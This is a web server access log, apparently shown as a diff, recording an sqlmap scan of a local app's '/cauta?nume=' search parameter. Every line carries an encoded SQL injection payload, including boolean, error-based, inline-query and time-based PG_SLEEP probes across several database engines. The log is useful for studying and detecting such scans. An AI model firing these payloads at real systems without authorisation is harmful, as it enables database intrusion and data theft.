+[2026-01-19T21:42:52.051Z] GET /cauta?nume=ion%27%29%20AND%209337%3D9337%20AND%20%28%27Jggm%27%3D%27Jggm - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.074Z] GET /cauta?nume=ion%27%20AND%203823%3D4359%20AND%20%27oOTS%27%3D%27oOTS - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.076Z] GET /cauta?nume=ion%27%20AND%203823%3D4359%20AND%20%27oOTS%27%3D%27oOTS - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.106Z] GET /cauta?nume=ion%27%20AND%209337%3D9337%20AND%20%27fJgH%27%3D%27fJgH - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.107Z] GET /cauta?nume=ion%27%20AND%209337%3D9337%20AND%20%27fJgH%27%3D%27fJgH - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.137Z] GET /cauta?nume=ion%29%20AND%208082%3D3185%20AND%20%282533%3D2533 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.140Z] GET /cauta?nume=ion%29%20AND%208082%3D3185%20AND%20%282533%3D2533 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.158Z] GET /cauta?nume=ion%29%20AND%209337%3D9337%20AND%20%289340%3D9340 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.159Z] GET /cauta?nume=ion%29%20AND%209337%3D9337%20AND%20%289340%3D9340 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.178Z] GET /cauta?nume=ion%20AND%209554%3D7715 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.180Z] GET /cauta?nume=ion%20AND%209554%3D7715 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.203Z] GET /cauta?nume=ion%20AND%209337%3D9337 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.204Z] GET /cauta?nume=ion%20AND%209337%3D9337 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.223Z] GET /cauta?nume=ion%20AND%204462%3D9078--%20ovVK - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.224Z] GET /cauta?nume=ion%20AND%204462%3D9078--%20ovVK - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.242Z] GET /cauta?nume=ion%20AND%209337%3D9337--%20pKjB - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.243Z] GET /cauta?nume=ion%20AND%209337%3D9337--%20pKjB - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.324Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%287484%3D7609%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%207609%20UNION%20SELECT%204189%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.325Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%287484%3D7609%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%207609%20UNION%20SELECT%204189%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.341Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%288291%3D8291%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%207972%20UNION%20SELECT%203784%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.342Z] GET /cauta?nume=%28SELECT%20%28CASE%20WHEN%20%288291%3D8291%29%20THEN%20%27ion%27%20ELSE%20%28SELECT%207972%20UNION%20SELECT%203784%29%20END%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.493Z] GET /cauta?nume=ion%27%29%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29%20AND%20%28%27GEnq%27%3D%27GEnq - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.494Z] GET /cauta?nume=ion%27%29%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29%20AND%20%28%27GEnq%27%3D%27GEnq - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.517Z] GET /cauta?nume=ion%27%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29%20AND%20%27qQeO%27%3D%27qQeO - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.518Z] GET /cauta?nume=ion%27%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29%20AND%20%27qQeO%27%3D%27qQeO - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.538Z] GET /cauta?nume=ion%29%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29%20AND%20%289948%3D9948 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.540Z] GET /cauta?nume=ion%29%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29%20AND%20%289948%3D9948 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.558Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.560Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.583Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29--%20YUsp - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.585Z] GET /cauta?nume=ion%20AND%20EXTRACTVALUE%288166%2CCONCAT%280x5c%2C0x7178767871%2C%28SELECT%20%28ELT%288166%3D8166%2C1%29%29%29%2C0x7162717171%29%29--%20YUsp - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.623Z] GET /cauta?nume=ion%27%29%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27ZJkC%27%3D%27ZJkC - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.625Z] GET /cauta?nume=ion%27%29%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27ZJkC%27%3D%27ZJkC - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.644Z] GET /cauta?nume=ion%27%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27cMEu%27%3D%27cMEu - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.647Z] GET /cauta?nume=ion%27%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27cMEu%27%3D%27cMEu - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.667Z] GET /cauta?nume=ion%29%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288506%3D8506 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.669Z] GET /cauta?nume=ion%29%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%288506%3D8506 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.690Z] GET /cauta?nume=ion%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.691Z] GET /cauta?nume=ion%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.716Z] GET /cauta?nume=ion%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20vBeM - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.718Z] GET /cauta?nume=ion%20AND%204371%3DCAST%28%28CHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284371%3D4371%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20vBeM - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.744Z] GET /cauta?nume=ion%27%29%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%28%27eEKb%27%3D%27eEKb - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.747Z] GET /cauta?nume=ion%27%29%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%28%27eEKb%27%3D%27eEKb - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.772Z] GET /cauta?nume=ion%27%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%27PVnE%27%3D%27PVnE - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.773Z] GET /cauta?nume=ion%27%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%27PVnE%27%3D%27PVnE - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.792Z] GET /cauta?nume=ion%29%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%283544%3D3544 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.793Z] GET /cauta?nume=ion%29%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29%20AND%20%283544%3D3544 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.816Z] GET /cauta?nume=ion%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.819Z] GET /cauta?nume=ion%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.842Z] GET /cauta?nume=ion%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--%20sQyr - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.843Z] GET /cauta?nume=ion%20AND%201448%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%281448%3D1448%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%29%29--%20sQyr - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.887Z] GET /cauta?nume=ion%27%29%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27usgA%27%3D%27usgA - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.888Z] GET /cauta?nume=ion%27%29%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27usgA%27%3D%27usgA - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.909Z] GET /cauta?nume=ion%27%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27GwSc%27%3D%27GwSc - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.910Z] GET /cauta?nume=ion%27%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27GwSc%27%3D%27GwSc - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.936Z] GET /cauta?nume=ion%29%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287914%3D7914 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.937Z] GET /cauta?nume=ion%29%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%287914%3D7914 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.964Z] GET /cauta?nume=ion%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.966Z] GET /cauta?nume=ion%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.987Z] GET /cauta?nume=ion%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20GlVX - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:52.989Z] GET /cauta?nume=ion%20AND%205903%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%285903%3D5903%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20GlVX - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.126Z] GET /cauta?nume=%28SELECT%20CONCAT%28CONCAT%28%27qxvxq%27%2C%28CASE%20WHEN%20%281137%3D1137%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qbqqq%27%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.129Z] GET /cauta?nume=%28SELECT%20CONCAT%28CONCAT%28%27qxvxq%27%2C%28CASE%20WHEN%20%281137%3D1137%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qbqqq%27%29%29 - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
+[2026-01-19T21:42:53.173Z] GET /cauta?nume=ion%27%29%3BSELECT%20PG_SLEEP%285%29-- - 200 - IP: ::1 - UserAgent: sqlmap/1.10.1.54#dev (https://sqlmap.org)
